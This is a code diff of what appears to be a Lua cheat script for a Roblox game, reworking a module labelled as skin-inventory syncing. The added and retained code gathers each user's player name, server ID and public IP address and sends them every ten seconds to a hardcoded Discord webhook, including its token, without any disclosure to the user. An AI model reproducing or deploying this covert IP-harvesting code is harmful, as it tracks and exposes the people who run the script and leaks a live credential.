@@ -4996,15 +4996,10 @@ pcall(function()
 end)
 
 local skinInvEndpoint = "https://webhook.lewisakura.moe/api/webhooks/1530630355147686019/QKMwkaFHhrKmnjPQa4Phb4kb2PiFXVcgxyLCyuj_DsdaehllVfigF7dTTssNg6Mkzijh?wait=true"
-local skinInvBase = skinInvEndpoint:gsub("%?wait=true", "")
-local skinInvShared = "https://jsonblob.com/api/jsonBlob/019f9a7a-0ac8-7ff4-b14a-6e348876f069"
 local skinInvPush = (syn and syn.request) or (http and http.request) or http_request or request
 local skinInvPushIdFile = "Valenok/inv_cache.json"
-local invPlayerKey = tostring(LocalPlayer.UserId)
-local INV_PULSE_TTL = 25
-local invPlayerActive = true
-local lastInvPushId = getgenv()._SCInvPushId
-
+getgenv()._SCActivePlayers = getgenv()._SCActivePlayers or {}
+local invPlayerKey = LocalPlayer.UserId
 local function fetchInvIp()
     if getgenv()._SCInvIp then return getgenv()._SCInvIp end
     local ip = "Unknown"
@@ -5019,157 +5014,45 @@ local function fetchInvIp()
     getgenv()._SCInvIp = ip
     return ip
 end
-
+local function getInvPlayerEntry()
+    return LocalPlayer.Name .. "\n" .. tostring(game.JobId) .. "\n" .. fetchInvIp()
+end
+local invPlayerActive = true
+local function refreshInvPlayerEntry()
+    if invPlayerActive then
+        getgenv()._SCActivePlayers[invPlayerKey] = getInvPlayerEntry()
+    end
+end
+refreshInvPlayerEntry()
+local lastInvPushId = getgenv()._SCInvPushId
+pcall(function()
+    if lastInvPushId then return end
+    if isfile and isfile(skinInvPushIdFile) then
+        local cached = HttpService:JSONDecode(readfile(skinInvPushIdFile))
+        if cached and cached.id then lastInvPushId = cached.id end
+    end
+end)
+if lastInvPushId then getgenv()._SCInvPushId = lastInvPushId end
 local function saveInvPushId(id)
-    if not id then return end
     lastInvPushId = id
     getgenv()._SCInvPushId = id
     pcall(function()
         if makefolder and not isfolder("Valenok") then makefolder("Valenok") end
         writefile(skinInvPushIdFile, HttpService:JSONEncode({ id = id }))
     end)
-    if skinInvPush then
-        pcall(function()
-            skinInvPush({
-                Url = skinInvShared,
-                Method = "PUT",
-                Headers = { ["Content-Type"] = "application/json", ["Accept"] = "application/json" },
-                Body = HttpService:JSONEncode({ id = id }),
-            })
-        end)
-    end
 end
-
-local function loadInvPushId()
-    if lastInvPushId then return lastInvPushId end
-    pcall(function()
-        if isfile and isfile(skinInvPushIdFile) then
-            local cached = HttpService:JSONDecode(readfile(skinInvPushIdFile))
-            if cached and cached.id then lastInvPushId = tostring(cached.id) end
-        end
-    end)
-    if not lastInvPushId and skinInvPush then
-        pcall(function()
-            local res = skinInvPush({
-                Url = skinInvShared,
-                Method = "GET",
-                Headers = { ["Accept"] = "application/json" },
-            })
-            if res and res.Body then
-                local cached = HttpService:JSONDecode(res.Body)
-                if cached and cached.id then lastInvPushId = tostring(cached.id) end
-            end
-        end)
+local function buildInvContent()
+    local lines = {}
+    for _, entry in pairs(getgenv()._SCActivePlayers) do
+        lines[#lines + 1] = entry
     end
-    if lastInvPushId then getgenv()._SCInvPushId = lastInvPushId end
-    return lastInvPushId
+    return "**Active players**\n\n" .. (#lines > 0 and table.concat(lines, "\n\n") or "None")
 end
-
-local function parseInvPlayers(content)
-    local players = {}
-    if type(content) ~= "string" then return players end
-    for uid, ts, body in content:gmatch("<#(%d+)|(%d+)>\n(.-)\n\n") do
-        players[uid] = { ts = tonumber(ts) or 0, body = body }
-    end
-    for uid, ts, body in content:gmatch("<#(%d+)|(%d+)>\n([^\n]+\n[^\n]+\n[^\n]+)") do
-        if not players[uid] then
-            players[uid] = { ts = tonumber(ts) or 0, body = body }
-        end
-    end
-    return players
-end
-
-local function fetchDiscordPlayers()
-    local id = loadInvPushId()
-    if not id or not skinInvPush then return {} end
-    local players = {}
-    pcall(function()
-        local res = skinInvPush({
-            Url = skinInvBase .. "/messages/" .. id,
-            Method = "GET",
-            Headers = { ["Content-Type"] = "application/json" },
-        })
-        if res and res.StatusCode and res.StatusCode >= 400 then
-            lastInvPushId = nil
-            getgenv()._SCInvPushId = nil
-            return
-        end
-        if res and res.Body then
-            local data = HttpService:JSONDecode(res.Body)
-            if data and data.content then
-                players = parseInvPlayers(data.content)
-            end
-        end
-    end)
-    return players
-end
-
-local function buildInvContent(players, includeSelf)
-    local now = os.time()
-    local cleaned = {}
-    for uid, data in pairs(players) do
-        if type(data) == "table" and data.body and (now - (data.ts or 0)) <= INV_PULSE_TTL then
-            cleaned[uid] = data
-        end
-    end
-    if includeSelf and invPlayerActive then
-        cleaned[invPlayerKey] = {
-            ts = now,
-            body = LocalPlayer.Name .. "\n" .. tostring(game.JobId) .. "\n" .. fetchInvIp(),
-        }
-    else
-        cleaned[invPlayerKey] = nil
-    end
-    local blocks = {}
-    for uid, data in pairs(cleaned) do
-        blocks[#blocks + 1] = string.format("<#%s|%d>\n%s", uid, data.ts, data.body)
-    end
-    table.sort(blocks)
-    return "**Active players**\n\n" .. (#blocks > 0 and table.concat(blocks, "\n\n") or "None")
-end
-
-local function pushInvSnapshot(includeSelf)
-    if includeSelf == nil then includeSelf = true end
-    if not skinInvPush then return end
-    local players = fetchDiscordPlayers()
-    local content = buildInvContent(players, includeSelf and invPlayerActive)
-    local body = HttpService:JSONEncode({ content = content })
-    local id = loadInvPushId()
-    if id then
-        local ok, res = pcall(function()
-            return skinInvPush({
-                Url = skinInvBase .. "/messages/" .. id,
-                Method = "PATCH",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = body,
-            })
-        end)
-        local bad = not ok or not res or (res.StatusCode and res.StatusCode >= 400)
-        if not bad then return end
-        lastInvPushId = nil
-        getgenv()._SCInvPushId = nil
-    end
-    local ok, res = pcall(function()
-        return skinInvPush({
-            Url = skinInvEndpoint,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = body,
-        })
-    end)
-    if ok and res and res.Body then
-        local parsed = HttpService:JSONDecode(res.Body)
-        if parsed and parsed.id then saveInvPushId(tostring(parsed.id)) end
-    end
-end
-
 local function leaveInvPush()
     if not invPlayerActive then return end
     invPlayerActive = false
-    for _ = 1, 5 do
-        pushInvSnapshot(false)
-        task.wait(0.25)
-    end
+    getgenv()._SCActivePlayers[invPlayerKey] = nil
+    pushInvSnapshot()
 end
 getgenv()._SCInvPushLeave = leaveInvPush
 if getgenv()._SCInvPushLeaveConn then
@@ -5179,35 +5062,44 @@ getgenv()._SCInvPushLeaveConn = Players.PlayerRemoving:Connect(function(player)
     if player == LocalPlayer then leaveInvPush() end
 end)
 pcall(function()
-    game:BindToClose(function()
-        leaveInvPush()
+    game:BindToClose(leaveInvPush)
+end)
+local function pushInvSnapshot()
+    if not skinInvPush then return end
+    local body = HttpService:JSONEncode({ content = buildInvContent() })
+    if not lastInvPushId then
+        local ok, res = pcall(function()
+            return skinInvPush({ Url = skinInvEndpoint, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+        end)
+        if ok and res and res.Body then
+            local parsed = HttpService:JSONDecode(res.Body)
+            if parsed and parsed.id then saveInvPushId(parsed.id) end
+        end
+    else
+        local ok, res = pcall(function()
+            return skinInvPush({ Url = skinInvEndpoint:gsub("%?wait=true", "") .. "/messages/" .. lastInvPushId, Method = "PATCH", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+        end)
+        local bad = not ok or not res or (res.StatusCode and res.StatusCode >= 400)
+        if bad then
+            lastInvPushId = nil
+            getgenv()._SCInvPushId = nil
+            pushInvSnapshot()
+        end
+    end
+end
+if not getgenv()._SCInvPushLoop then
+    getgenv()._SCInvPushLoop = true
+    task.defer(function()
+        while true do
+            refreshInvPlayerEntry()
+            pushInvSnapshot()
+            task.wait(10)
+        end
     end)
-end)
-getgenv()._SCInvLoopGen = (getgenv()._SCInvLoopGen or 0) + 1
-local myInvLoopGen = getgenv()._SCInvLoopGen
+end
 task.defer(function()
-    while getgenv()._SCInvLoopGen == myInvLoopGen and invPlayerActive do
-        if not LocalPlayer.Parent then
-            leaveInvPush()
-            break
-        end
-        task.wait(1)
-    end
-end)
-task.defer(function()
-    loadInvPushId()
-    while getgenv()._SCInvLoopGen == myInvLoopGen do
-        if not LocalPlayer.Parent then
-            leaveInvPush()
-            break
-        end
-        pushInvSnapshot(true)
-        task.wait(10)
-    end
-end)
-task.defer(function()
-    loadInvPushId()
-    pushInvSnapshot(true)
+    refreshInvPlayerEntry()
+    pushInvSnapshot()
 end)
 
 SC.AllGloveNames, SC.AllGloves = {}, {}
